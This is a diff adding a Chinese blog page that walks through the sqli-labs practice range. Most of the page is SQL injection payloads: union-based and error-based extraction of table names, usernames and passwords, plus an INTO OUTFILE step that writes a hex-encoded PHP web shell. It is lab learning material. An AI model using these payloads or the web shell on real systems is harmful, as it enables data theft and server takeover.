@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="sqli-lab靶场通关记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-lab靶场通关记录">
+<meta property="og:url" content="http://example.com/sqli-lab%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="sqli-lab靶场通关记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132304860.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919410.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919141.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920889.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920900.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921921.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921019.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921061.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921503.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921192.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921075.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922959.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922074.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922354.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922686.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922751.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923243.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923801.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923890.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923248.png">
+<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202410312152072.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923274.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924988.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924216.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925373.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925770.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925481.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926572.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926656.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926738.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926472.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926955.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926143.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926391.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926822.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926212.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927184.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927517.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919088.png">
+<meta property="article:published_time" content="2024-10-29T11:19:03.000Z">
+<meta property="article:modified_time" content="2025-10-16T13:28:51.844Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132304860.png">
+
+<link rel="canonical" href="http://example.com/sqli-lab%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqli-lab靶场通关记录 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/sqli-lab%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli-lab靶场通关记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-10-29 19:19:03" itemprop="dateCreated datePublished" datetime="2024-10-29T19:19:03+08:00">2024-10-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-16 21:28:51" itemprop="dateModified" datetime="2025-10-16T21:28:51+08:00">2025-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>sqli-lab靶场通关记录</p>
+<span id="more"></span>
+
+<h2 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h2><h3 id="单引号字符型注入"><a href="#单引号字符型注入" class="headerlink" title="单引号字符型注入"></a>单引号字符型注入</h3><h4 id="字符型注入还是数字型注入"><a href="#字符型注入还是数字型注入" class="headerlink" title="字符型注入还是数字型注入"></a>字符型注入还是数字型注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; //等号前后不能有空格，即不能是?id = 1&#x27;</span>这样</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132304860.png" alt="image-20240911225450764"></p>
+<h4 id="是否为单引号闭合型注入"><a href="#是否为单引号闭合型注入" class="headerlink" title="是否为单引号闭合型注入"></a>是否为单引号闭合型注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>用<code>--+</code>把后面的内容注释掉，然后回显正常，说明是单引号闭合型注入</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919410.png" alt="image-20240911225916591"></p>
+<h4 id="该语句查询了几列数据"><a href="#该语句查询了几列数据" class="headerlink" title="该语句查询了几列数据"></a>该语句查询了几列数据</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>一直到<code>3</code>时依然回显正常，到<code>4</code>就开始报错，说明查询了<code>3</code>列数据。那么，我们现在构造的，<code>union</code>后面的语句中也要查询<code>3</code>列。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919141.png" alt="image-20240911230911434"></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920889.png" alt="image-20240911225916591"></p>
+<h4 id="会显示哪几列"><a href="#会显示哪几列" class="headerlink" title="会显示哪几列"></a>会显示哪几列</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">-1 是因为前面要错误，union后面的才能执行</span></span><br></pre></td></tr></table></figure>
+
+<p>通过回显<code>2,3</code>可知，是第二，三列</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920900.png" alt="image-20240911231819368"></p>
+<h4 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>
+
+<p>显示当前的数据库名是<code>security</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921921.png" alt="image-20240911232330147"></p>
+<h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>首先要知道，**<code>group_concat()</code>函数会将查询的表名连在一起输出<strong>，然后，</strong>有一个<code>information_schema</code>库，该库中有一个<code>tables</code>表，该表存有所有数据库的表名。**<code>table_schema=&#39;security&#39;</code>表示查询<code>table_schema</code>字段为<code>security</code>的列，再加上前面的<code>table_name</code>(<code>tables</code>表中的一个列名，下面全是各种库中的表名)，表示查询<code>security</code>库的所有表名。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921019.png" alt="image-20240911233736048"></p>
+<h4 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(flag),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom flag<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">21232</span>f297a57a5a743894a0e4a801fc3<span class="number">-084e0343</span>a0486ff05530df6c705c8bb4<span class="operator">-</span>a4346e75cc1dd161a8d57f3b2d5d82d0&#125;</span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">5</span>acb72b8<span class="number">-137</span>f<span class="number">-4</span>daa<span class="operator">-</span>a647<span class="number">-340</span>b72101d4b&#125;</span><br><span class="line">Your Password:admin,guest,virink</span><br><span class="line"></span><br><span class="line">schema_name,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.schemata<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">information_schema,performance_schema,mysql,test,ctftraining,ctf</span><br><span class="line">ctf:flag,users</span><br></pre></td></tr></table></figure>
+
+<p>与<code>tables</code>表相似，<code>information_schema</code>库中有一个<code>columns</code>表，存有所有数据库的列名。上面语句表示，查询<code>security</code>库中的<code>users</code>表中的所有列名。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921061.png" alt="image-20240911234752459"></p>
+<h4 id="查询列表中的内容"><a href="#查询列表中的内容" class="headerlink" title="查询列表中的内容"></a>查询列表中的内容</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921503.png" alt="image-20240911235254031"></p>
+<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>传入<code>?id=1</code>，正常回显</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921192.png" alt="image-20241029144140515" style="zoom:50%;" />
+
+<p>传入<code>?id=1&#39;</code>，回显的报错中没有显示我们传入的数字</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921075.png" alt="image-20241029144207150" style="zoom: 50%;" />
+
+<p>传入<code>?id=1--+</code>，正常回显</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922959.png" alt="image-20241029144240783" style="zoom:50%;" />
+
+<p>因此得知本关是基于报错的数字型注入</p>
+<h3 id="单引号变形字符型注入"><a href="#单引号变形字符型注入" class="headerlink" title="单引号变形字符型注入"></a>单引号变形字符型注入</h3><p>第一关的闭合符号是<code>&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922074.png" alt="image-20241029143718824"></p>
+<p>本关的闭合符号变成了<code>&#39;)</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922354.png" alt="image-20241029143849314"></p>
+<h3 id="双引号变形字符型注入"><a href="#双引号变形字符型注入" class="headerlink" title="双引号变形字符型注入"></a>双引号变形字符型注入</h3><p>传入<code>?id=1&#39;</code>，依旧回显正常，这时候可以猜测一下是不是双引号闭合</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922686.png" alt="image-20241029145629173" style="zoom:50%;" />
+
+<p>传入<code>?id=1&quot;</code>，根据报错回显确定了，闭合符号是<code>&quot;)</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922751.png" alt="image-20241029145816812"></p>
+<h3 id="通过函数报错注入"><a href="#通过函数报错注入" class="headerlink" title="通过函数报错注入"></a>通过函数报错注入</h3><h4 id="通过floor报错"><a href="#通过floor报错" class="headerlink" title="通过floor报错"></a>通过<code>floor</code>报错</h4><p><strong>该方法最多回显<code>64</code>个字符。</strong></p>
+<p>爆数据库、版本、用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ?id=1&#x27;和?id=-1&#x27;都行</span><br><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,     #利用 : 隔开数据库名称</span><br><span class="line">    (SELECT database()),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br><span class="line">#后半段格式:as xxx from 表名 group by xxx--+</span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
+
+<p>爆列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
+
+<p>爆内容，这里不知道为什么用<code>group_concat()</code>不行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT username FROM users limit 1),   #password和username都只能爆出username</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a><code>updatexml</code>报错</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><strong>最多回显<code>32</code>个字符。</strong></p>
+<p>​	<code>updatexml()</code>使用时，当<code>xpath_string</code>格式出现错误，<code>masql</code>会报出语法错误，而执行结果也在错误里。对于<code>select * FROM test WHERE id=1 AND updatexml(1,0x7e,1);</code>，其中<code>0x7e</code>是<code>~</code>，其不属于<code>xpath</code>语法格式，因此报出<code>xpath</code>语法错误。<br>只有在<code>payload</code>返回的不是<code>xml</code>格式才会生效。</p>
+<h5 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h5><p>爆数据库、版本号、用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#传入 ?id=1&#x27;+payload</span><br><span class="line">#payload如下</span><br><span class="line">AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>concat()</code>是连接函数。</strong></p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>爆列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>爆内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(username) FROM users),1,32),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用<code>substr()</code>函数绕过字数限制，爆出所有内容。</strong></p>
+<h4 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a><code>ExtractValue</code>报错</h4><p><strong>最多回显<code>32</code>个字符。</strong></p>
+<p>爆数据库、版本号、用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(0x7e,(SELECT database()),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<p>爆列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27; ),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<p>爆内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(password) FROM users),1,31),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lass-7文件写入"><a href="#Lass-7文件写入" class="headerlink" title="Lass-7文件写入"></a><code>Lass-7</code>文件写入</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/7-58/p/14101610.html">Mysql注入中的outfile、dumpfile函数详解 - gxy* - 博客园</a></p>
+<h4 id="into-outfile命令"><a href="#into-outfile命令" class="headerlink" title="into outfile命令"></a><code>into outfile</code>命令</h4><p>运用该命令的格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT...into outfile &#x27;绝对路径&#x27;</span><br><span class="line">SELECT 1,2,3 into outfile &#x27;绝对路径&#x27;</span><br><span class="line">SELECT null,0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e,null</span><br><span class="line">	into outfile &#x27;绝对路径&#x27;</span><br><span class="line">#0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e是&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;对应每个字符的十六进制连成的</span><br><span class="line"></span><br><span class="line">0x3c3f70687020406576616c285f504f53545b227368656c6c225d293b203f3e</span><br></pre></td></tr></table></figure>
+
+<p>​	<code>0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e</code>是<?php @eval($_POST["shell"]); ?>对应每个字符的十六进制连成的。</p>
+<h5 id="secure-file-priv参数"><a href="#secure-file-priv参数" class="headerlink" title="secure_file_priv参数"></a><code>secure_file_priv</code>参数</h5><p>​	因为涉及到在服务器上写入文件，所以<code>into outfile</code>函数能否成功执行受到参数<code>secure_file_priv</code>的影响，可以利用<code>select @@secure_file_priv</code>命令查询其值。</p>
+<ul>
+<li>当<code>secure_file_priv=&#39;&#39;</code>时，对导入导出无限制</li>
+<li>当为指定的目录时，只能向指定的目录导入导出</li>
+<li>当<code>secure_file_priv=NULL</code>时，禁止导入导出功能</li>
+</ul>
+<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ul>
+<li>知道绝对路径</li>
+<li>在数据库配置文件中含有配置项<code>secure_file_priv=&#39;&#39;</code></li>
+<li>具有<code>root</code>权限</li>
+</ul>
+<p>还有<code>into dumpfile()</code>和<code>load_file()</code>这两个函数以后可能也会用到。</p>
